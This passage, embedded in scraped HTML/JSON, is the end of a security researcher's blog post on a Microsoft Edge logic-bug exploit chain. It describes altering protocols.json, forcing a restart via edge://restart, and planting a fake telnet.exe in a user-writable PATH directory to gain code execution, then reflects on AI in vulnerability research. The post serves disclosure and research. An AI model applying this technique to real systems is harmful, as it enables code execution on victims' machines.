</span><span>\"allow\"</span><span>:</span><span> </span><span>[</span><span>\n    </span><span>{</span><span>\n      </span><span>\"origins\"</span><span>:</span><span> </span><span>[</span><span>\n        </span><span>\"https://.get.microsoft.com\"</span><span>,</span><span>\n        </span><span>\"https://.apps.microsoft.com\"</span><span>\n      </span><span>],</span><span>\n      </span><span>\"protocol\"</span><span>:</span><span> </span><span>\"ms-windows-store\"</span><span>\n    </span><span>},</span><span>\n    </span><span>{</span><span>\n      </span><span>\"origins\"</span><span>:</span><span> </span><span>[</span><span>\n        </span><span>\"https://.onedrive.com\"</span><span>,</span><span>\n        </span><span>\"https://.onedrive.live.com\"</span><span>,</span><span>\n        </span><span>\"https://sharepoint.com\"</span><span>\n      </span><span>],</span><span>\n      </span><span>\"protocol\"</span><span>:</span><span> </span><span>\"ms-word\"</span><span>\n    </span><span>},</span><span>\n    </span><span>//</span><span> </span><span>[</span><span>...</span><span>]</span><span>\n  </span><span>],</span><span>\n  </span><span>\"warn\"</span><span>:</span><span> </span><span>[</span><span>\n    </span><span>//</span><span> </span><span>[</span><span>...</span><span>]</span><span>\n  </span><span>],</span><span>\n  </span><span>\"block\"</span><span>:</span><span> </span><span>[</span><span>\n    </span><span>//</span><span> </span><span>[</span><span>...</span><span>]</span><span>\n  </span><span>]</span><span>\n</span><span>}</span><span>\n</span></code></pre><p>As for how do we get Microsoft Edge to re-initialize? Just use our earlier browser-initiated navigation to jump to <code>edge://restart</code>! :)</p><h3 id=\"sec-14\">From <code>telnet://</code> to Code Execution!</h3><p>Here we chose <code>telnet://</code> to get code execution. On Windows, the telnet handler would try to invoke <code>telnet.exe</code>, but the binary isn’t shipped by default, so Windows goes looking for it in the directories listed in the PATH environment variable. And one of those directories just happens to be writable by us…</p><pre><code><span>C:\\WINDOWS\\system32</span><span>\n</span><span>C:\\WINDOWS</span><span>\n</span><span>C:\\WINDOWS\\System32\\Wbem</span><span>\n</span><span>C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0</span><span>\n</span><span>C:\\WINDOWS\\System32\\OpenSSH</span><span>\n</span><span>C:\\Users\\lowpriv\\AppData\\Local\\Microsoft\\WindowsApps</span><span>    </span><span># &lt;--- it's writable for `lowpriv`...</span><span>\n</span></code></pre><p>So by simply dropping a modified <code>protocols.json</code> and a 32-bit tiny PE, we got ACE. The whole exploit is less than 100 lines of code. The restart isn’t really necessary in a real attack, only for Pwn2Own. Let’s check out the demo! 🔥</p><h2 id=\"sec-15\">Final Thoughts</h2><p>From zero experience with modern browser exploitation to completing the full chain, the whole research took me two full months, with no LLMs/AI involved at all. But why, you might ask? Perhaps because it sounds cool, or maybe it was also just good timing — I only started using coding agents like Codex and Claude Code around March this year, and by then, I’d already found all the bugs and done the hard part ¯\\_(ツ)_/¯</p><p>So what’s the hard part? For memory corruption, it’s often the exploitation. But we’re playing with logic bugs, where the hard part is finding them, and once you find them all, chaining is the easiest part. So that’s also why I kept the whole exploit AI-free.</p><p>Apart from that, I also see the UXSS primitive as a new attack surface, and agree that in the AI era, “<a href=\"https://x.com/steventseeley/status/2035096238178410582\">Attack Surface is the new 0day</a>”. I wanted to explore this gold mine more before sharing it with the AI giants. That’s another reason why I decided not to use AI on this chain.</p><p>Of course, I’m not some old-fashioned guy who refuses to try new things, either. Outside of this chain, I’m also tokenmaxxing and addicted to AI. I believe once you’ve tasted how convenient LLMs are, no one would want to go back to hunting bugs by hand. That’s also the future, I think.</p><p>I’m also not that afraid of being replaced by AI. I’d rather say it’s precisely because of AI, I finally have enough time to finish all the cool stuff that’s been sitting on my TODO list… like the Windows RCE <a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-58608\">I just reported</a>, flipping the chain to <a href=\"https://youtu.be/Bh1zglq4mLE\">pop Microsoft Edge from <code>calc.exe</code></a>, or porting this logic-only full chain to Google Chrome (almost there &gt;&lt;). I’ll also show some progress at <a href=\"https://codeblue.jp/en/program/time-table/day1-t1-08-origin-we-trust/\">CODE BLUE</a> in Japan next month. Stay tuned! 😉</p><p>So instead of worrying about how low the bar for vuln research can go, why not get excited about how high AI can take us? What fun can we have, what even cooler hacks can we build, and what impossible things can we make happen…?</p><p>Never Stop Exploiting!</p><h3 id=\"sec-16\"><a href=\"https://devco.re/en/blog/author/orange\">Orange Tsai</a></h3><p><span>Principal Security Researcher</span></p><p>\n                            I am Orange : )\n                        </p>","zhKind","complete","漏洞分析","利用链","复现","Microsoft","Google","https://devco.re/blog/2026/10/28/the-last-proof-of-human-craft-forging-a-microsoft-edge-full-chain-with-logic-bugs-only-en/","DevCo",{"_150":151,"_152":-5},"changelogVersion","2026-10-01T08:00","release"]
